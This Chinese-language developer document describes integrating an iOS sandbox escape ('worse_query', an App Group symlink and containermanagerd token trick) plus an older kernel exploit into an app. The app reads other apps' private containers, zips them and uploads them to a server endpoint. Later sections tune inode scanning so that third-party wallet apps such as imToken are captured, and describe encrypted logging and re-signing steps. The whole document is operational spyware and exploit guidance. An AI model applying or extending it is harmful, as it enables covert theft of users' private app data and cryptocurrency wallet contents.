# iOS 26.6.2 / 27.x 采集链路：接入 worse_query

## 1. 为什么 26.6.1 是分界

| 版本 | 访问方式 | 位置 |
| --- | --- | --- |
| ≤ 26.1.0 | 内置 apptrace / libapptracecore 二进制 | `LegacyTraceGate` |
| 26.1.1 – 26.6.1 | kernel exploit（`kexploit_opa334` + `sandbox_escape`）+ MCM / bad_query | `kexploit/`、`exploit/bad_query.c` |
| 26.6.2 起 | **没有可用内核偏移** | `kexploit/offsets.m` 的表停在 26.x |

`offsets.m` 只有 17.x / 18.x / 26.x 偏移，`kexploit_opa334.m` 的版本分支同样到 26.x。
所以在 26.6.2 / 27.x 上：`sandbox_escape()` 拿不到 `ucred → sandbox → ext_set` 链路，
`hasSandboxAccess()` 恒为 0，所有"读别的 App 容器"的代码被沙盒拒绝，
采集循环里每个 bundle 都停在 `collect: skip … — container unavailable`，ZIP 数量为 0。

## 2. worse_query 的做法（与上游一致）

上游 `forcequitOS/worse_query` 是 `bad_query` 的后继，覆盖 **iOS 26.0 – 26.7.2 / 27.x**，
用的是"符号链接 + App Group 的 part 3"，不是 part-domain 穿越：

1. 进程必须持有 `com.apple.security.application-groups`，并有一个 App Group 容器
   （`containerURLForSecurityApplicationGroupIdentifier:`）。
2. 把该 group 的 `Library/Caches` 删掉，改成指向目标路径的符号链接。
3. 向 containermanagerd 查询：`class 7`（App Group）、`group_identifiers = <group>`、
   `part 3`（= Library/Caches）。
4. `container_copy_sandbox_token` → `sandbox_extension_consume`：内核按符号链接的
   realpath 发放扩展，于是 token 覆盖的是**目标路径**。
5. 查询结束后把 `Library/Caches` 恢复成普通目录（`clean_symlink`）。

flags 有两档：默认 `0x0000008000000000`，App Group 相关的路径在 iOS 26.x 上要
`0x0000000800000000`。`worse_query_grant()` 会自动两档都试。

可访问的路径（上游 README）：

```
/var/containers/Data/System (iOS 27)
/var/containers/Shared/SystemGroup/* (iOS 27)
/var/mobile/Containers/Data/Application/*
/var/mobile/Containers/Data/InternalDaemon/*
/var/mobile/Containers/Data/PluginKitPlugin/*
/var/mobile/Containers/Shared/AppGroup/*
/var/mobile/Containers/Shared/AppGroup (iOS 27)
```

## 3. 本项目的落地

`exploit/worse_query.m` / `.h` 是上游实现的移植（函数名、返回码、symlink 时序一致），
另外加了三样本项目需要的东西：

* `worse_query_grant(target, create_dir)`：自己从 entitlements 取 group、两档 flags 重试、
  用锁串行化（每次授权都会改写同一个 `Library/Caches`）。
* `worse_query_container_identifier(path)`：读
  `com.apple.containermanager.identifier` xattr，拿容器对应的 bundle id
  （上游枚举就是这么认容器的），比解析 `.com.apple.mobile_container_manager.metadata.plist`
  更快，也不依赖 plist 可读。
* `worse_query_last_message()` / `worse_query_last_group()`：一行式诊断，
  写进 `Documents/log2`，方便在 27 上定位是"没有 group（-1）"还是"query 被拒（-5）"。

`helpers/UserlandAccess.swift` 是 Swift 封装：`grant` / `revoke` / `probe` /
`RetainedLease`。`probe()` 先看内核逃逸，再对存在的容器根试一次授权，
成功后缓存；失败不缓存（App Group 容器可能在下一次查询后才建出来）。

### 采集 → 压缩 → 上传

token 是唯一入口时，扩展必须活过整段复制：

```
resolveContainer()  ─┬─→ MCM 路径（可能成功，但 27 上不一定带 token）
                     └─→ worse_query 授权（handle）
        │
        ├─ 保留 lease（UserlandAccess.RetainedLease）
        ├─ resolvedItemURL(): fileExists 检查（需要权限）
        ├─ 复制到 Documents/.collect-*/<appName>/（需要权限）
        ├─ createZIPArchive()（只碰自有沙盒，不再需要权限）
        ├─ uploadZip() → /api/upload/zip
        └─ defer: release lease
```

`Utils.swift` 的 `resolveContainer` 现在返回 `CollectContainerResolution`
（路径 + lease 数组）：普通容器、`group.*` 容器、绝对路径项都会先拿扩展，
绝对路径项还会尝试 `/private` 前缀与逐级父目录；`runCycle` 用 `defer` 在单个 bundle
结束（zip + 上传完成）后释放。

### 27 的路径布局

`ContainerStore` 同时扫两套根：

```swift
appDataRoots   = ["/var/mobile/Containers/Data/Application", "/var/containers/Data/Application"]
systemDataRoots = ["/var/mobile/Containers/Data/System",    "/var/containers/Data/System"]
metadataScanRoots = appDataRoots + [PluginKitPlugin, InternalDaemon 两套布局]
```

`resolveAppContainerPathByMetadataScan` 会遍历这些根，用
`worse_query_container_identifier()`（xattr 优先）匹配 bundle id，
命中后保留该容器的 lease 供后续复制使用。

## 4. 版本策略

```swift
supportsKernelExploit(major:minor:patch:)   // 17.x, 18.0–18.7.1, 26.0–26.6.1
canAttemptKernelExploit(...)                // + 27.0 已登记的 beta build
supportsUserlandAccess(major:minor:patch:)  // 26.6.2 起、27.x 全系
isSupported(...)                            // 两者取并
route(...) -> .kernel / .userland
```

`KernelExploit.isApplicable()` 只对真有偏移的版本返回 true，27 GA 上不再跑内核链；
`AppState.refreshUserlandStatus()` 在无内核路由的机器上后台跑一次 `probe()`，
成功即标 `OK via userland (worse_query)`，失败把 `worse_query_last_message()` 写进日志。

## 5. 签名要求（关键）

`worse_query` 的前提是 App Group。工程已加：

* `ThreeOneOSFive/ThreeOneOSFive.entitlements`
  ```xml
  <key>com.apple.security.application-groups</key>
  <array><string>group.com.yangjiii.3105</string></array>
  ```
* `project.pbxproj`：两处 `CODE_SIGN_ENTITLEMENTS = "ThreeOneOSFive/ThreeOneOSFive.entitlements"`
* `exploit/worse_query.m`：`WQ_DEFAULT_GROUP` 与上面保持一致

重签 IPA 时这份 entitlements 必须注入（换成你自己的 group id 也行，两处一起改）。
如果注入后 `worse_query_last_message()` 出现
`no container for App Group …`，说明该 group 在设备上没有建出来——先确认签名里确实带了
`application-groups`，再确认这个 group id 在本机允许创建。

## 6. 构建

```bash
xcodebuild -project ThreeOneOSFive.xcodeproj -scheme ThreeOneOSFive \
  -configuration Release -sdk iphoneos -destination 'generic/platform=iOS' \
  CODE_SIGNING_ALLOWED=NO build
```

新增源文件已在工程里：`exploit/worse_query.m`（Sources）、`exploit/worse_query.h`、
`helpers/UserlandAccess.swift`（Sources）；桥接头已 `#import "exploit/worse_query.h"`。

## 6.1 27 上的性能与诊断（依据真机 log_26 / log2 修正）

真机（iOS 27.0.1，24A446）日志暴露了两个问题，已修：

| 现象 | 原因 | 修复 |
| --- | --- | --- |
| `userland: grant refused /var/mobile/Containers/Data/Application code=-6` | 目录**根**被 MCM 回答但拿不到 token（-6）；能发 token 的是容器目录 | `enumerateDirectoriesWithTraversalGrant` 在无内核逃逸时不再对根 grant，直接 inode walk；token 只对容器申请 |
| `enumerate: inode fallback … 227 entries` 之后卡 20–30 秒 | `bad_query_list` 单线程扫 2,000,000 inode | 新增 `bad_query_list_range`，Swift 侧 8 分片并发；默认 600k 上限，结果过少才扩到 2M；结果按路径缓存 120 秒 |
| 13 个 bundle 每个都重扫全部 root | 每次 `resolveAppContainerPath` 都重新扫描 | 新增容器索引（bundle id → 容器路径，xattr 读取，TTL 300 秒，主线程不构建）；索引非空即权威，不再逐 bundle 重扫 |
| 采集跑到一半 App 被挂起 | 容器发现与采集抢时间 | `reportInstalledApps` 挪到 ZIP 循环之后；`inferredApp` 先用索引反查，跳过 grant + Saved State 探测 |
| 上传结果看不到 | `AppLog` 落盘会过滤 `protocol:` / `/api` 行 | 上传/上报结果、probe 结果、device/report 结果都额外写 `Documents/log2`（明文） |

现在 `worse_query_grant` 会记住上次成功的 group + flags（1 次查询），并对 -6 直接短路，不再对同一路径把 4 个 group × 2 档 flags 全试一遍。

### 6.2 第二轮真机日志（27.0.1）修正的问题

| 现象 | 原因 | 修复 |
| --- | --- | --- |
| 13 个 bundle 全部 `metadata scan skipped — no filesystem access`，`zips=0` | 采集线程与后台 probe 竞态：`probe()` 在别的线程运行时立刻返回 false，`hasFilesystemAccess` 因此为 false | `probe()` 改为等待在飞的 probe（最多 40 s）；`hasFilesystemAccess` 认可已建好的容器索引；`metadataScan` 先查索引再判断访问能力 |
| `container index built — mapped=1051 grants=1051` 用了 18.71 s | 索引把 App / PluginKit / InternalDaemon 全部扫了 | 索引只扫 app 数据根（约 230 个容器）；PluginKit / InternalDaemon 改为按需懒加载 |
| 采集在索引就绪前就跑完 | `runCycle` 不等待索引 | 循环前 `await` 预热一次索引，并写入 `collect: container index N bundles` |
| `zips=0` 的成功结果不再重试 | `collectIfNeeded` 只在 `.failed` 时重试 | `zipCount == 0` 的成功结果也允许下一次前台重试 |

真机确认：`grants=1051 refused=0`、`userland: probe=true path=/var/mobile/Containers/Data/PluginKitPlugin/…` —— worse_query 在 27.0.1 上工作正常，剩下的都是调度与时序问题。

### 6.3 第三轮真机日志：为什么“装了 imToken 却看不到”

真机（27.0.1）导出的 `container-index.txt` 有 227 条，**全部是 `com.apple.*` 系统 App**，
没有任何第三方 App；`im.token.app` 命中 `nearest=none`。原因不在授权，而在**inode 扫描范围**：

* 系统 App 的容器在设备初始化时就创建，inode 落在低区间（< 1M）；
* 用户后来安装的 App（imToken、钱包等）容器 inode 高得多；
* 固定上限（600k / 2M）的 inode walk 只会返回那 227 个系统容器，于是索引里没有第三方 App，
  `resolveAppContainerPath` 只能判定“未安装”。

修复（`enumerateDirectories` 的 inode 路径）：

| 改动 | 说明 |
| --- | --- |
| 分段扫描 | 每次 1M inode，逐段推进，不再用单一固定上限 |
| 起点参考 | 用自身容器（`Documents` 的 `st_ino`）估算量级，最少扫到 `max(8M, 2×自身 inode)` |
| 停止条件 | 连续 4 段无新增条目才停（防止空洞区间提前结束） |
| 并行度 | 每段 16 分片（`bad_query_list_range`，`fsgetpath` 线程安全），每段约 0.5–0.8 s |
| 日志 | `enumerate: <root> own container inode=…, minimum scan=…` 与 `… scanned to inode N` |

新版本索引里应当能看到 `im.token.app`；`Documents/container-index.txt` 会随之上报真实安装列表。

## 7. 真机验证清单（27.x）

1. `Documents/log2`：
   ```
   route: userland (kernel offsets: false)
   userland extension group: group.com.yangjiii.3105; entitled groups: [...]
   userland extension verified: true; last error: …
   app: userland extension route active
   ```
2. 采集日志（`Documents/Logs/log`，AES，用原工具解）：
   ```
   collect: retained 1 userland lease(s) for com.xxx
   collect: zip SUCCESS — collect-<app>-<stamp>.zip bytes=…
   protocol: upload SUCCESS — … bundle=com.xxx
   collect: done total=N zips=N uploaded=N
   ```
3. 失败码对照（`worse_query_last_message()` 里同时有目标路径与 group）：
   * `-1` 没有 App Group 容器 → 签名没带 entitlement / group 未创建
   * `-2` containermanager 符号缺失 → 系统私有库变了
   * `-4` symlink 创建失败 → `Library/Caches` 被占用或 group 容器只读
   * `-5` query 被 containermanagerd 拒绝 → 该 build 收紧了 part 3 查询
   * `-6` query 返回但没有 token → 内核未发放扩展
4. 上游注释里提到的枚举技巧：对目录取**父目录**的扩展后列子项（AppGroup / 27 的 System
   根可用），本项目用的是"逐容器授权"，等价效果，不需要额外实现。

## 8. 文件清单

| 文件 | 作用 |
| --- | --- |
| `exploit/worse_query.h` | 接口：`worse_query` / `worse_query_grant` / `_release` / `_entitled_groups` / `_last_group` / `_last_message` / `_container_identifier` |
| `exploit/worse_query.m` | 上游 worse_query 的移植：App Group + part 3 + symlink + token，两档 flags、串行化、诊断 |
| `exploit/bad_query.c` | 保留为第二档回退（part-domain 老路） |
| `helpers/UserlandAccess.swift` | Swift 封装、probe 缓存、`RetainedLease` |
| `helpers/ContainerStore.swift` | 授权 userland 优先；26/27 双根扫描；xattr 优先认容器；retained lease |
| `helpers/Utils.swift` | `CollectContainerResolution`（路径 + lease），复制/打包/上传期间保持 |
| `helpers/SupportPolicy.swift` | 内核 / 用户态双路由与版本表 |
| `helpers/KernelExploit.swift` | 只对存在偏移的版本跑内核链，`hasEffectiveFileAccess()` |
| `App.swift` | 无内核路由的版本改判 userland 状态 |
| `ThreeOneOSFive.entitlements` | `com.apple.security.application-groups` |
